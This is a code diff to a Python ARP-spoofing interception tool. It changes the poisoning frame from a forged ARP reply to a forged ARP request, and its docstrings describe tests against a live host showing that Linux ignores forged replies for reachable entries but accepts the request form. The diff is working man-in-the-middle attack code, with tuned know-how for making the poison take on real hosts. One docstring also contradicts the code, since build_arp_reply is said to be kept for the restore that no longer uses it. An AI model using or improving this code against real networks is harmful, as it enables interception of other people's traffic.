@@ -63,14 +63,51 @@ def mac_to_bytes(mac: str) -> bytes:
 def build_arp_reply(src_mac: str, src_ip: str, dst_mac: str, dst_ip: str) -> bytes:
     """An unsolicited ARP reply: "src_ip is at src_mac".
 
-    A REPLY rather than a request because a host accepts an unsolicited reply for an
-    entry it already holds, which is what makes the mapping take effect immediately.
+    KEPT FOR THE RESTORE ONLY. See build_arp_announcement for why a REPLY cannot install a
+    mapping on a modern host; this function is retained because correcting a mapping back to
+    the truth is a different case (see Interception.restore_frame).
+
     Pure function so the frame construction is testable without a socket or root.
     """
     frame = mac_to_bytes(dst_mac) + mac_to_bytes(src_mac) + struct.pack("!H", ETH_P_ARP)
     frame += struct.pack("!HHBBH", 1, 0x0800, 6, 4, ARP_OP_REPLY)
     frame += mac_to_bytes(src_mac) + socket.inet_aton(src_ip)
     frame += mac_to_bytes(dst_mac) + socket.inet_aton(dst_ip)
+    return frame
+
+
+def build_arp_announcement(claimed_mac: str, claimed_ip: str,
+                           dst_mac: str, dst_ip: str) -> bytes:
+    """A forged ARP REQUEST that installs a mapping: "who-has dst_ip tell claimed_ip".
+
+    THIS IS THE FRAME THAT ACTUALLY POISONS, and the reason is a Linux behaviour that
+    silently ignores the frame the product originally sent.
+
+    MEASURED against a real host on a live segment (192.168.3.193), each frame type sent 8
+    times, reading the destination MAC of the host's reply to an off-link probe:
+
+        forged ARP reply, unicast         ->  ignored   (reply still went to the real gateway)
+        forged ARP REQUEST, unicast       ->  TOOK      (reply came to us, 3/3)
+        gratuitous broadcast reply        ->  ignored
+
+    Linux will not update a neighbour entry that is in REACHABLE state from an UNSOLICITED
+    ARP REPLY. A host's gateway entry is essentially always REACHABLE, because the host
+    talks to its gateway constantly -- so the reply was discarded every time, while the
+    frame itself was perfectly well formed. That is why every earlier attempt concluded
+    "the poison never took": it genuinely never did.
+
+    An ARP REQUEST is processed as an announcement of the sender's mapping ("I am
+    claimed_ip at claimed_mac") regardless of the receiving entry's state, so it installs
+    the mapping. The request still asks `who-has dst_ip`, which the target answers on the
+    wire; we ignore that answer, since our own mapping is already installed.
+
+    A reply is still the right frame for a RESTORE, where the goal is to correct an entry
+    that is currently wrong-and-stale rather than to displace a healthy one.
+    """
+    frame = mac_to_bytes(dst_mac) + mac_to_bytes(claimed_mac) + struct.pack("!H", ETH_P_ARP)
+    frame += struct.pack("!HHBBH", 1, 0x0800, 6, 4, ARP_OP_REQUEST)
+    frame += mac_to_bytes(claimed_mac) + socket.inet_aton(claimed_ip)
+    frame += b"\x00" * 6 + socket.inet_aton(dst_ip)
     return frame
 
 
@@ -93,12 +130,27 @@ class Interception:
     our_mac: str          # our MAC, i.e. the lie we are telling
 
     def poison_frame(self) -> bytes:
-        """Forge: claim_ip is at OUR mac, sent to the host."""
-        return build_arp_reply(self.our_mac, self.claim_ip, self.host_mac, self.host_ip)
+        """Forge: claim_ip is at OUR mac, sent to the host.
+
+        An ANNOUNCEMENT (ARP request), not a reply. Measured against a real host: a forged
+        reply is silently ignored for a REACHABLE entry, and a host's gateway entry is
+        always reachable -- so the reply form never installed anything. See
+        build_arp_announcement.
+        """
+        return build_arp_announcement(self.our_mac, self.claim_ip,
+                                      self.host_mac, self.host_ip)
 
     def restore_frame(self) -> bytes:
-        """Correct: claim_ip is at the REAL mac, sent to the host."""
-        return build_arp_reply(self.real_mac, self.claim_ip, self.host_mac, self.host_ip)
+        """Correct: claim_ip is at the REAL mac, sent to the host.
+
+        The same frame form as the poison, for the same reason: the announcement installs a
+        mapping regardless of the entry's state. A reply would be processed for a STALE
+        entry (which is what the poisoned entry is), but relying on a state distinction for
+        the RESTORE is the wrong place to be clever -- the restore is the safety property,
+        so it uses the form that provably works in every state.
+        """
+        return build_arp_announcement(self.real_mac, self.claim_ip,
+                                      self.host_mac, self.host_ip)
 
 
 class ForwardingMonitor:
